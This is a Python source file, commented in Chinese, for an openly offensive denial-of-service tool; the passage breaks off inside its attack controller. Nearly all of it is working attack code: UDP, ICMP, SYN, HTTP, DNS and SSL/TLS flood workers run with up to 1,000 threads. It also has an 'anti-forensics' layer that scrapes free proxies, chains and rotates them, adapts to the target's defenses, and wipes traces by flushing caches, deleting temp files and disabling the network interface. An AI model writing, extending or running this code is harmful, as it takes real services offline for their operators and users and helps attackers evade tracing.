import time
import socket
import random
import argparse
import sys
import asyncio
import aiohttp
import base64
import hashlib
import json
import requests
import subprocess
import platform
import os
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from scapy.all import IP, TCP, ICMP, UDP, DNS, DNSQR, send, sr1, IP, TCP, Raw
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from bs4 import BeautifulSoup
import threading
import queue
import re
import ssl
import ipaddress

# 全局配置
MAX_WORKERS = 1000
CONNECTION_TIMEOUT = 5
ENCRYPTION_KEY = Fernet.generate_key()
cipher_suite = Fernet(ENCRYPTION_KEY)

# 攻击模式配置
ATTACK_MODES = {
    "udp": {"name": "UDP洪水", "enabled": True, "weight": 1.0},
    "icmp": {"name": "ICMP洪水", "enabled": True, "weight": 1.0},
    "syn": {"name": "SYN洪水", "enabled": True, "weight": 1.0},
    "http": {"name": "HTTP洪水", "enabled": True, "weight": 1.0},
    "dns": {"name": "DNS洪水", "enabled": True, "weight": 1.0},
    "ssl_tls": {"name": "SSL/TLS洪水", "enabled": True, "weight": 1.0}
}

# 动态模式切换配置
DYNAMIC_MODE_CONFIG = {
    "interval": 30,  # 模式切换间隔(秒)
    "min_duration": 10,  # 每种模式最小持续时间(秒)
    "max_concurrent": 4,  # 最大并发攻击模式数
    "adaptive": True,  # 是否启用自适应调整
    "response_threshold": 3.0,  # 响应时间阈值(秒)
    "error_threshold": 0.3  # 错误率阈值
}


class ProxyPool:
    """代理池管理类"""
    
    def __init__(self):
        self.proxies = []  # 所有代理列表
        self.active_proxies = []  # 活跃代理列表
        self.proxy_scores = {}  # 代理评分字典
        self.proxy_usage_count = {}  # 代理使用次数
        self.proxy_last_used = {}  # 代理最后使用时间
        self.proxy_blacklist = set()  # 代理黑名单
        self.proxy_lock = threading.Lock()  # 线程锁
        self.proxy_sources = [  # 代理来源
            "https://www.kuaidaili.com/free/inha/",
            "https://www.xicidaili.com/nn/",
            "https://free.kuaidaili.com/free/inha/",
            "http://www.nimadaili.com/https/",
            "http://freeproxylists.net/zh/"
        ]
        self.min_proxy_score = 50  # 最低代理分数
        self.max_proxy_usage = 100  # 最大使用次数
        self.proxy_refresh_interval = 3600  # 代理刷新间隔(秒)
        self.last_refresh_time = 0  # 上次刷新时间
        self.health_check_interval = 300  # 健康检查间隔(秒)
        self.last_health_check = 0  # 上次健康检查时间
        
    def fetch_proxies(self):
        """从多个来源获取代理"""
        new_proxies = []
        
        for source in self.proxy_sources:
            try:
                print(f"[代理池] 正在从 {source} 获取代理...")
                if "kuaidaili.com" in source:
                    new_proxies.extend(self._fetch_kuaidaili(source))
                elif "xicidaili.com" in source:
                    new_proxies.extend(self._fetch_xicidaili(source))
                elif "nimadaili.com" in source:
                    new_proxies.extend(self._fetch_nimadaili(source))
                elif "freeproxylists.net" in source:
                    new_proxies.extend(self._fetch_freeproxylists(source))
            except Exception as e:
                print(f"[代理池] 从 {source} 获取代理失败: {e}")
        
        return new_proxies
    
    def _fetch_kuaidaili(self, url):
        """从快代理获取代理"""
        proxies = []
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            response = requests.get(url, headers=headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            table = soup.find('table', {'id': 'list'})
            if table:
                trs = table.find_all('tr')[1:]  # 跳过表头
                for tr in trs:
                    tds = tr.find_all('td')
                    if len(tds) >= 7:
                        ip = tds[0].text.strip()
                        port = tds[1].text.strip()
                        proxy_type = tds[3].text.strip().lower()
                        proxies.append({
                            'ip': ip,
                            'port': port,
                            'type': proxy_type,
                            'source': 'kuaidaili'
                        })
        except Exception as e:
            print(f"[代理池] 从快代理获取代理失败: {e}")
        
        return proxies
    
    def _fetch_xicidaili(self, url):
        """从西刺代理获取代理"""
        proxies = []
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            response = requests.get(url, headers=headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            table = soup.find('table', {'id': 'ip_list'})
            if table:
                trs = table.find_all('tr')[1:]  # 跳过表头
                for tr in trs:
                    tds = tr.find_all('td')
                    if len(tds) >= 7:
                        ip = tds[1].text.strip()
                        port = tds[2].text.strip()
                        proxy_type = tds[5].text.strip().lower()
                        proxies.append({
                            'ip': ip,
                            'port': port,
                            'type': proxy_type,
                            'source': 'xicidaili'
                        })
        except Exception as e:
            print(f"[代理池] 从西刺代理获取代理失败: {e}")
        
        return proxies
    
    def _fetch_nimadaili(self, url):
        """从尼玛代理获取代理"""
        proxies = []
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            response = requests.get(url, headers=headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            table = soup.find('table', {'class': 'fl-table'})
            if table:
                trs = table.find_all('tr')[1:]  # 跳过表头
                for tr in trs:
                    tds = tr.find_all('td')
                    if len(tds) >= 1:
                        ip_port = tds[0].text.strip()
                        if ':' in ip_port:
                            ip, port = ip_port.split(':')
                            proxies.append({
                                'ip': ip,
                                'port': port,
                                'type': 'https',
                                'source': 'nimadaili'
                            })
        except Exception as e:
            print(f"[代理池] 从尼玛代理获取代理失败: {e}")
        
        return proxies
    
    def _fetch_freeproxylists(self, url):
        """从FreeProxyLists获取代理"""
        proxies = []
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            response = requests.get(url, headers=headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # 使用正则表达式匹配IP和端口
            ip_pattern = r'<td>(\d+\.\d+\.\d+\.\d+)</td>'
            port_pattern = r'<td>(\d+)</td>'
            
            ip_matches = re.findall(ip_pattern, response.text)
            port_matches = re.findall(port_pattern, response.text)
            
            # 确保IP和端口数量匹配
            min_len = min(len(ip_matches), len(port_matches))
            for i in range(min_len):
                proxies.append({
                    'ip': ip_matches[i],
                    'port': port_matches[i],
                    'type': 'http',
                    'source': 'freeproxylists'
                })
        except Exception as e:
            print(f"[代理池] 从FreeProxyLists获取代理失败: {e}")
        
        return proxies
    
    def validate_proxy(self, proxy):
        """验证代理的可用性"""
        try:
            proxy_url = f"{proxy['type']}://{proxy['ip']}:{proxy['port']}"
            test_url = "http://httpbin.org/ip"
            
            start_time = time.time()
            response = requests.get(
                test_url,
                proxies={proxy['type']: proxy_url},
                timeout=5
            )
            response_time = time.time() - start_time
            
            if response.status_code == 200:
                # 验证成功，返回响应时间和评分
                score = max(0, 100 - int(response_time * 20))  # 响应时间越短，评分越高
                return True, response_time, score
        except Exception as e:
            pass
        
        return False, 0, 0
    
    def health_check(self):
        """代理健康检查"""
        current_time = time.time()
        
        # 检查是否需要健康检查
        if current_time - self.last_health_check < self.health_check_interval:
            return
        
        self.last_health_check = current_time
        print("[代理池] 开始代理健康检查...")
        
        # 随机选择部分活跃代理进行检查
        check_proxies = random.sample(
            self.active_proxies, 
            min(20, len(self.active_proxies))
        ) if self.active_proxies else []
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.validate_proxy, proxy) for proxy in check_proxies]
            
            for i, future in enumerate(futures):
                is_valid, response_time, score = future.result()
                proxy = check_proxies[i]
                key = f"{proxy['ip']}:{proxy['port']}"
                
                if not is_valid:
                    # 代理失效，加入黑名单
                    with self.proxy_lock:
                        self.proxy_blacklist.add(key)
                        self.active_proxies = [p for p in self.active_proxies if f"{p['ip']}:{p['port']}" != key]
                        print(f"[代理池] 代理 {key} 失效，已加入黑名单")
                else:
                    # 更新代理评分
                    with self.proxy_lock:
                        self.proxy_scores[key] = score
    
    def refresh_proxies(self):
        """刷新代理池"""
        current_time = time.time()
        
        # 检查是否需要刷新
        if current_time - self.last_refresh_time < self.proxy_refresh_interval and len(self.active_proxies) > 10:
            return
        
        print("[代理池] 开始刷新代理池...")
        self.last_refresh_time = current_time
        
        # 获取新代理
        new_proxies = self.fetch_proxies()
        
        # 验证新代理
        valid_proxies = []
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(self.validate_proxy, proxy) for proxy in new_proxies]
            
            for i, future in enumerate(futures):
                is_valid, response_time, score = future.result()
                if is_valid:
                    proxy = new_proxies[i]
                    proxy['response_time'] = response_time
                    proxy['score'] = score
                    valid_proxies.append(proxy)
        
        # 更新代理池
        with self.proxy_lock:
            # 合并新旧代理，保留旧代理的评分和使用记录
            proxy_dict = {f"{p['ip']}:{p['port']}": p for p in self.proxies}
            
            for proxy in valid_proxies:
                key = f"{proxy['ip']}:{proxy['port']}"
                if key in self.proxy_blacklist:
                    continue  # 跳过黑名单中的代理
                
                if key in proxy_dict:
                    # 保留旧代理的评分和使用记录
                    old_proxy = proxy_dict[key]
                    proxy['score'] = old_proxy.get('score', proxy['score'])
                    proxy['usage_count'] = old_proxy.get('usage_count', 0)
                    proxy['last_used'] = old_proxy.get('last_used', 0)
                
                proxy_dict[key] = proxy
            
            self.proxies = list(proxy_dict.values())
            
            # 更新活跃代理列表（只包含评分高于最低分的代理）
            self.active_proxies = [p for p in self.proxies if p.get('score', 0) >= self.min_proxy_score]
            
            # 初始化代理评分和使用记录
            for proxy in self.proxies:
                key = f"{proxy['ip']}:{proxy['port']}"
                if key not in self.proxy_scores:
                    self.proxy_scores[key] = proxy.get('score', 50)
                if key not in self.proxy_usage_count:
                    self.proxy_usage_count[key] = 0
                if key not in self.proxy_last_used:
                    self.proxy_last_used[key] = 0
        
        print(f"[代理池] 代理池刷新完成，共 {len(self.active_proxies)} 个活跃代理")
    
    def get_best_proxy(self):
        """获取最佳代理"""
        with self.proxy_lock:
            # 如果活跃代理列表为空，刷新代理池
            if not self.active_proxies:
                self.refresh_proxies()
                if not self.active_proxies:
                    return None
            
            # 根据评分和使用次数选择代理
            # 评分高、使用次数少的代理优先
            best_proxy = None
            best_score = -1
            
            for proxy in self.active_proxies:
                key = f"{proxy['ip']}:{proxy['port']}"
                score = self.proxy_scores[key]
                usage_count = self.proxy_usage_count[key]
                
                # 计算综合评分（考虑原始评分和使用次数）
                # 使用次数越多，综合评分越低
                adjusted_score = score - (usage_count * 0.5)
                
                if adjusted_score > best_score:
                    best_score = adjusted_score
                    best_proxy = proxy
            
            # 更新代理使用记录
            if best_proxy:
                key = f"{best_proxy['ip']}:{best_proxy['port']}"
                self.proxy_usage_count[key] += 1
                self.proxy_last_used[key] = time.time()
                
                # 如果代理使用次数过多，降低其评分
                if self.proxy_usage_count[key] > self.max_proxy_usage:
                    self.proxy_scores[key] = max(0, self.proxy_scores[key] - 10)
                    
                    # 如果评分低于最低分，从活跃代理列表中移除
                    if self.proxy_scores[key] < self.min_proxy_score:
                        self.active_proxies = [p for p in self.active_proxies if f"{p['ip']}:{p['port']}" != key]
            
            return best_proxy
    
    def get_proxy_chain(self, length=2):
        """获取代理链"""
        chain = []
        
        # 确保代理池中有足够的代理
        if len(self.active_proxies) < length:
            self.refresh_proxies()
            if len(self.active_proxies) < length:
                # 如果仍然不足，返回尽可能长的链
                length = len(self.active_proxies)
        
        # 获取指定长度的代理链
        for _ in range(length):
            proxy = self.get_best_proxy()
            if proxy:
                chain.append(proxy)
        
        return chain
    
    def update_proxy_score(self, proxy, success):
        """更新代理评分"""
        key = f"{proxy['ip']}:{proxy['port']}"
        
        with self.proxy_lock:
            if key in self.proxy_scores:
                if success:
                    # 成功使用，增加评分
                    self.proxy_scores[key] = min(100, self.proxy_scores[key] + 1)
                else:
                    # 使用失败，降低评分
                    self.proxy_scores[key] = max(0, self.proxy_scores[key] - 5)
                    
                    # 如果评分低于最低分，从活跃代理列表中移除
                    if self.proxy_scores[key] < self.min_proxy_score:
                        self.active_proxies = [p for p in self.active_proxies if f"{p['ip']}:{p['port']}" != key]
    
    def get_proxy_stats(self):
        """获取代理池统计信息"""
        with self.proxy_lock:
            return {
                'total_proxies': len(self.proxies),
                'active_proxies': len(self.active_proxies),
                'blacklisted_proxies': len(self.proxy_blacklist),
                'proxy_sources': list(set(p.get('source', 'unknown') for p in self.proxies)),
                'avg_score': sum(self.proxy_scores.values()) / len(self.proxy_scores) if self.proxy_scores else 0,
                'high_score_proxies': len([s for s in self.proxy_scores.values() if s >= 80]),
                'medium_score_proxies': len([s for s in self.proxy_scores.values() if 50 <= s < 80]),
                'low_score_proxies': len([s for s in self.proxy_scores.values() if s < 50])
            }


class AIAntiForensics:
    """AI反溯源系统"""

    def __init__(self, security_level="medium"):
        self.security_level = security_level
        self.proxy_pool = ProxyPool()  # 使用新的代理池
        self.current_proxy = None
        self.current_proxy_chain = []
        self.last_rotation = datetime.now()
        self.attack_history = []
        self.defense_detected = False
        self.attack_mode_stats = {}  # 记录各攻击模式的统计信息
        self.current_attack_modes = []  # 当前启用的攻击模式
        self.last_mode_switch = datetime.now()  # 上次模式切换时间
        self.setup_config()
        self.load_resources()
        print(f"[反溯源] 系统启动 - 安全级别: {security_level.upper()}")
        
        # 初始化代理池
        self.proxy_pool.refresh_proxies()
        
        # 初始化攻击模式统计
        for mode in ATTACK_MODES:
            self.attack_mode_stats[mode] = {
                'success_count': 0,
                'fail_count': 0,
                'avg_response_time': 0,
                'last_used': None
            }
    
    def setup_config(self):
        """配置安全参数"""
        levels = {
            "low": {"rotate_min": 10, "proxy_layers": 1, "cleanup": False},
            "medium": {"rotate_min": 5, "proxy_layers": 2, "cleanup": True},
            "high": {"rotate_min": 3, "proxy_layers": 3, "cleanup": True},
            "paranoid": {"rotate_min": 1, "proxy_layers": 4, "cleanup": True}
        }
        self.config = levels.get(self.security_level, levels["medium"])

    def load_resources(self):
        """加载指纹资源"""
        # 浏览器指纹
        self.fingerprints = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
        ]

    def get_proxy_chain(self):
        """获取代理链"""
        return self.proxy_pool.get_proxy_chain(self.config['proxy_layers'])

    def get_next_proxy(self):
        """获取下一个代理"""
        return self.proxy_pool.get_best_proxy()

    def should_rotate(self):
        """检查是否需要轮换"""
        return (datetime.now() - self.last_rotation).seconds >= self.config['rotate_min'] * 60

    def rotate_identity(self):
        """轮换身份"""
        if self.config['proxy_layers'] > 1:
            # 使用代理链
            new_proxy_chain = self.get_proxy_chain()
            self.current_proxy_chain = new_proxy_chain
            new_proxy = new_proxy_chain[0] if new_proxy_chain else None
        else:
            # 使用单个代理
            new_proxy = self.get_next_proxy()
            self.current_proxy_chain = [new_proxy] if new_proxy else []
        
        new_fingerprint = random.choice(self.fingerprints)
        self.last_rotation = datetime.now()
        self.current_proxy = new_proxy
        
        if new_proxy:
            print(f"[反溯源] 身份轮换 -> {new_proxy['ip']}:{new_proxy['port']} ({new_proxy['type']})")
            if len(self.current_proxy_chain) > 1:
                chain_str = " -> ".join([f"{p['ip']}:{p['port']}" for p in self.current_proxy_chain])
                print(f"[反溯源] 代理链: {chain_str}")
        
        return new_proxy, new_fingerprint

    def detect_defense(self, response_time, status_code, attack_mode="unknown"):
        """检测防御动作"""
        # 记录攻击历史
        self.attack_history.append({
            'time': datetime.now(),
            'response_time': response_time,
            'status': status_code,
            'attack_mode': attack_mode
        })

        # 更新攻击模式统计
        if attack_mode in self.attack_mode_stats:
            stats = self.attack_mode_stats[attack_mode]
            if status_code < 400:
                stats['success_count'] += 1
            else:
                stats['fail_count'] += 1
            
            # 更新平均响应时间
            total_requests = stats['success_count'] + stats['fail_count']
            current_avg = stats['avg_response_time']
            stats['avg_response_time'] = (current_avg * (total_requests - 1) + response_time) / total_requests
            stats['last_used'] = datetime.now()

        # 分析最近记录
        recent = self.attack_history[-10:]
        if len(recent) < 5:
            return False

        # 检测异常
        slow_count = sum(1 for r in recent if r['response_time'] > 3.0)
        error_count = sum(1 for r in recent if r['status'] >= 400)

        if slow_count > 2 or error_count > 3:
            self.defense_detected = True
            
            # 更新当前代理的评分（失败）
            if self.current_proxy:
                self.proxy_pool.update_proxy_score(self.current_proxy, False)
            
            return True
        
        # 更新当前代理的评分（成功）
        if self.current_proxy:
            self.proxy_pool.update_proxy_score(self.current_proxy, True)
            
        return False

    def execute_evasion(self):
        """执行规避策略"""
        strategies = [self.slow_down, self.change_pattern, self.inject_legitimate]
        for strategy in random.sample(strategies, random.randint(1, 2)):
            strategy()

    def slow_down(self):
        """降速规避"""
        print("[反溯源] 执行降速策略")
        time.sleep(random.uniform(2, 5))

    def change_pattern(self):
        """改变攻击模式"""
        print("[反溯源] 改变攻击特征")
        # 强制轮换身份
        self.rotate_identity()

    def inject_legitimate(self):
        """注入合法流量"""
        print("[反溯源] 注入伪装流量")

    def cleanup(self):
        """清理痕迹"""
        if not self.config['cleanup']:
            return

        actions = [self.clear_dns, self.flush_arp, self.clean_temp]
        for action in actions:
            try:
                action()
            except:
                pass
        print("[反溯源] 痕迹清理完成")

    def clear_dns(self):
        """清除DNS缓存"""
        system = platform.system()
        if system == "Windows":
            subprocess.run(["ipconfig", "/flushdns"], capture_output=True)
        elif system == "Darwin":
            subprocess.run(["sudo", "dscacheutil", "-flushcache"], capture_output=True)

    def flush_arp(self):
        """清除ARP缓存"""
        system = platform.system()
        if system == "Windows":
            subprocess.run(["arp", "-d", "*"], capture_output=True)

    def clean_temp(self):
        """清理临时文件"""
        temp_dirs = ["/tmp/", os.path.expanduser("~/tmp/")]
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                for file in os.listdir(temp_dir):
                    if file.endswith('.tmp'):
                        try:
                            os.remove(os.path.join(temp_dir, file))
                        except:
                            pass

    def emergency_stop(self):
        """紧急停止"""
        print("[反溯源] 🚨 执行紧急停止！")
        self.cleanup()
        # 模拟网络断开
        try:
            if platform.system() == "Windows":
                subprocess.run(["netsh", "interface", "set", "interface", "Ethernet", "admin=disable"],
                               capture_output=True)
        except:
            pass
        
        # 输出代理池统计信息
        stats = self.proxy_pool.get_proxy_stats()
        print(f"[代理池] 统计信息: {stats}")

    def select_attack_modes(self):
        """动态选择攻击模式"""
        current_time = datetime.now()
        
        # 检查是否需要切换模式
        if ((current_time - self.last_mode_switch).seconds < DYNAMIC_MODE_CONFIG["min_duration"] and 
            self.current_attack_modes):
            return self.current_attack_modes
        
        # 如果启用自适应调整，根据统计信息调整攻击模式
        if DYNAMIC_MODE_CONFIG["adaptive"]:
            self.adjust_attack_weights()
        
        # 根据权重选择攻击模式
        enabled_modes = [mode for mode, config in ATTACK_MODES.items() if config["enabled"]]
        
        # 按权重排序
        sorted_modes = sorted(
            enabled_modes,
            key=lambda m: ATTACK_MODES[m]["weight"],
            reverse=True
        )
        
        # 选择最多max_concurrent个模式
        selected_count = min(DYNAMIC_MODE_CONFIG["max_concurrent"], len(sorted_modes))
        selected_modes = sorted_modes[:selected_count]
        
        self.current_attack_modes = selected_modes
        self.last_mode_switch = current_time
        
        mode_names = [ATTACK_MODES[mode]["name"] for mode in selected_modes]
        print(f"[反溯源] 攻击模式切换: {', '.join(mode_names)}")
        
        return selected_modes

    def adjust_attack_weights(self):
        """根据攻击效果调整权重"""
        for mode, stats in self.attack_mode_stats.items():
            if mode not in ATTACK_MODES:
                continue
                
            total_requests = stats['success_count'] + stats['fail_count']
            if total_requests < 10:  # 数据不足，不调整
                continue
                
            success_rate = stats['success_count'] / total_requests
            avg_response = stats['avg_response_time']
            
            # 根据成功率和响应时间调整权重
            if success_rate < 0.7 or avg_response > DYNAMIC_MODE_CONFIG["response_threshold"]:
                # 效果不佳，降低权重
                ATTACK_MODES[mode]["weight"] *= 0.9
            else:
                # 效果良好，增加权重
                ATTACK_MODES[mode]["weight"] *= 1.1
            
            # 确保权重在合理范围内
            ATTACK_MODES[mode]["weight"] = max(0.1, min(2.0, ATTACK_MODES[mode]["weight"]))


# 加密函数
def encrypt_data(data):
    """加密数据"""
    if isinstance(data, str):
        data = data.encode()
    return cipher_suite.encrypt(data)


def decrypt_data(encrypted_data):
    """解密数据"""
    return cipher_suite.decrypt(encrypted_data).decode()


# 攻击函数（集成反溯源）
async def udp_flood_async(ip, port, speed, count, anti_forensics=None):
    """UDP洪水攻击"""
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        tasks = []
        for i in range(count):
            task = loop.run_in_executor(
                executor,
                udp_flood_worker,
                ip, port, speed, anti_forensics, i
            )
            tasks.append(task)
        await asyncio.gather(*tasks)


def udp_flood_worker(ip, port, speed, anti_forensics, worker_id):
    """UDP工作线程"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(CONNECTION_TIMEOUT)

        # 使用反溯源
        if anti_forensics and anti_forensics.should_rotate():
            proxy, _ = anti_forensics.rotate_identity()

        data = random._urandom(1490)
        while True:
            sock.sendto(data, (ip, port))

            # 随机延迟增加隐蔽性
            delay = (1000 - speed) / 2000 * random.uniform(0.8, 1.2)
            time.sleep(delay)

    except Exception as e:
        if anti_forensics:
            anti_forensics.detect_defense(10.0, 500, "udp")


async def icmp_flood_async(ip, speed, count, anti_forensics=None):
    """ICMP洪水攻击"""
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        tasks = []
        for i in range(count):
            task = loop.run_in_executor(
                executor,
                icmp_flood_worker,
                ip, speed, anti_forensics, i
            )
            tasks.append(task)
        await asyncio.gather(*tasks)


def icmp_flood_worker(ip, speed, anti_forensics, worker_id):
    """ICMP工作线程"""
    try:
        while True:
            # 使用反溯源
            if anti_forensics and anti_forensics.should_rotate():
                proxy, _ = anti_forensics.rotate_identity()

            # 随机化包参数
            packet = IP(
                dst=ip,
                ttl=random.randint(30, 255),
                id=random.randint(1000, 65535)
            ) / ICMP()

            send(packet, verbose=0)
            time.sleep((1000 - speed) / 3000 * random.uniform(0.8, 1.2))

    except Exception as e:
        if anti_forensics:
            anti_forensics.detect_defense(10.0, 500, "icmp")


async def syn_flood_async(ip, port, speed, count, anti_forensics=None):
    """SYN洪水攻击"""
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        tasks = []
        for i in range(count):
            task = loop.run_in_executor(
                executor,
                syn_flood_worker,
                ip, port, speed, anti_forensics, i
            )
            tasks.append(task)
        await asyncio.gather(*tasks)


def syn_flood_worker(ip, port, speed, anti_forensics, worker_id):
    """SYN工作线程"""
    try:
        while True:
            if anti_forensics and anti_forensics.should_rotate():
                proxy, _ = anti_forensics.rotate_identity()

            # 随机化TCP参数
            sport = random.randint(1024, 65535)
            seq = random.randint(1000, 4294967295)
            packet = IP(dst=ip) / TCP(
                sport=sport,
                dport=port,
                flags="S",
                seq=seq
            )

            send(packet, verbose=0)
            time.sleep((1000 - speed) / 2500 * random.uniform(0.8, 1.2))

    except Exception as e:
        if anti_forensics:
            anti_forensics.detect_defense(10.0, 500, "syn")


async def http_flood_async(ip, port, speed, count, anti_forensics=None):
    """HTTP洪水攻击"""
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(count):
            task = asyncio.create_task(
                http_flood_worker(session, ip, port, speed, anti_forensics, i)
            )
            tasks.append(task)
        await asyncio.gather(*tasks)


async def http_flood_worker(session, ip, port, speed, anti_forensics, worker_id):
    """HTTP工作协程"""
    url = f"http://{ip}:{port}/"

    # 生成请求头
    headers = {
        'User-Agent': random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive'
    }

    while True:
        try:
            start_time = time.time()
            
            # 设置代理
            proxy = None
            if anti_forensics and anti_forensics.current_proxy_chain:
                # 使用代理链的第一个代理
                proxy_info = anti_forensics.current_proxy_chain[0]
                proxy = f"{proxy_info['type']}://{proxy_info['ip']}:{proxy_info['port']}"

            async with session.get(
                    url,
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=5),
                    ssl=False
            ) as response:
                response_time = time.time() - start_time

                # 检测防御
                if anti_forensics:
                    detected = anti_forensics.detect_defense(response_time, response.status, "http")
                    if detected:
                        anti_forensics.execute_evasion()

                # 模拟正常用户
                if random.random() > 0.7:
                    await response.read()

        except Exception as e:
            if anti_forensics:
                anti_forensics.detect_defense(10.0, 500, "http")

        # 随机延迟
        delay = (1000 - speed) / 1000 * random.uniform(0.8, 1.2)
        await asyncio.sleep(delay)


async def dns_flood_async(target, speed, count, anti_forensics=None):
    """DNS洪水攻击"""
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        tasks = []
        for i in range(count):
            task = loop.run_in_executor(
                executor,
                dns_flood_worker,
                target, speed, anti_forensics, i
            )
            tasks.append(task)
        await asyncio.gather(*tasks)


def dns_flood_worker(target, speed, anti_forensics, worker_id):
    """DNS洪水攻击工作线程"""
    try:
        # 常见DNS查询类型
        query_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "PTR"]
        
        # 随机子域名生成
        def generate_random_subdomain():
            length = random.randint(5, 15)
            return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(length))
        
        while True:
            # 使用反溯源
            if anti_forensics and anti_forensics.should_rotate():
                proxy, _ = anti_forensics.rotate_identity()
            
            # 随机选择DNS查询类型
            qtype = random.choice(query_types)
            
            # 生成随机查询域名
            if random.random() > 0.5:
                # 查询随机子域名
                subdomain = generate_random_subdomain()
                qname = f"{subdomain}.{target}"
            else:
                # 直接查询目标域名
                qname = target
            
            # 构造DNS查询包
            ip_layer = IP(
                dst=target,  # 目标DNS服务器
                ttl=random.randint(30, 255),
                id=random.randint(1000, 65535)
            )
            
            udp_layer = UDP(
                sport=random.randint(1024, 65535),
                dport=53  # DNS端口
            )
            
            dns_layer = DNS(
                rd=1,  # 递归查询
                qd=DNSQR(
                    qname=qname,
                    qtype=qtype
                )
            )
            
            # 发送DNS查询包
            packet = ip_layer / udp_layer / dns_layer
            send(packet, verbose=0)
            
            # 随机延迟
            delay = (1000 - speed) / 2000 * random.uniform(0.8, 1.2)
            time.sleep(delay)
            
    except Exception as e:
        if anti_forensics:
            anti_forensics.detect_defense(10.0, 500, "dns")


async def ssl_tls_flood_async(ip, port, speed, count, anti_forensics=None):
    """SSL/TLS洪水攻击"""
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(count):
            task = asyncio.create_task(
                ssl_tls_flood_worker(session, ip, port, speed, anti_forensics, i)
            )
            tasks.append(task)
        await asyncio.gather(*tasks)


async def ssl_tls_flood_worker(session, ip, port, speed, anti_forensics, worker_id):
    """SSL/TLS洪水攻击工作协程"""
    url = f"https://{ip}:{port}/"
    
    # SSL/TLS版本和密码套件
    ssl_versions = [
        ssl.TLSVersion.TLSv1_2,
        ssl.TLSVersion.TLSv1_3
    ]
    
    # 生成请求头
    headers = {
        'User-Agent': random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    while True:
        try:
            start_time = time.time()
            
            # 设置代理
            proxy = None
            if anti_forensics and anti_forensics.current_proxy_chain:
                # 使用代理链的第一个代理
                proxy_info = anti_forensics.current_proxy_chain[0]
                proxy = f"{proxy_info['type']}://{proxy_info['ip']}:{proxy_info['port']}"
            
            # 随机选择SSL/TLS版本
            ssl_context = ssl.create_default_context()
            ssl_context.minimum_version = random.choice(ssl_versions)
            
            # 随机化密码套件
            cipher_suites = [
                'TLS_AES_256_GCM_SHA384',
                'TLS_CHACHA20_POLY1305_SHA256',
                'TLS_AES_128_GCM_SHA256',
                'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384',
                'ECDHE-ECDSA-CHACHA20-POLY1305',
                'ECDHE-RSA-CHACHA20-POLY1305'
            ]
            ssl_context.set_ciphers(random.choice(cipher_suites))
            
            # 发起SSL/TLS握手
            async with session.get(
                    url,
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=ssl_context
            ) as response:
                response_time = time.time() - start_time
                
                # 检测防御
                if anti_forensics:
                    detected = anti_forensics.detect_defense(response_time, response.status, "ssl_tls")
                    if detected:
                        anti_forensics.execute_evasion()
                
                # 模拟正常用户
                if random.random() > 0.7:
                    await response.read()
                    
        except Exception as e:
            if anti_forensics:
                anti_forensics.detect_defense(10.0, 500, "ssl_tls")
        
        # 随机延迟
        delay = (1000 - speed) / 800 * random.uniform(0.8, 1.2)
        await asyncio.sleep(delay)


async def dynamic_attack_controller(ip, port, speed, concurrency, anti_forensics):
    """动态攻击控制器"""
    tasks = []
    
    # 初始选择攻击模式
    current_modes = anti_forensics.select_attack_modes()
    
    # 为每种模式创建任务
    for mode in current_modes:
        if mode == "udp":
